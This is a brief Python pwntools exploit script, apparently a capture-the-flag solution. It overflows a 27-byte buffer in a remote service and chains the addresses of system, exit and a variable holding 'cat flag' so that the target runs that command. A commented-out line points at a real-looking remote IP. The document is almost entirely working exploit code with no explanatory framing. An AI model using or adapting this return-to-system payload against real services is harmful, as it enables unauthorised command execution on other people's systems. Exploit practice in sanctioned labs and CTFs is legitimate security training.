from pwn import *

# Open program
# p = remote("51.15.171.241", 9004)
p = remote("localhost", 9000)

user = b"cat flag"

p.sendline(user)

authenticate = b"1"

p.sendline(authenticate)

buffer = b'A' * 27
buffer += p32(0x80490c0) # system function
buffer += p32(0x80490d0) # exit function
buffer += p32(0x804c06c) # user variable addr

# Send payload
p.sendline(buffer)

# While p is running, print the output
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
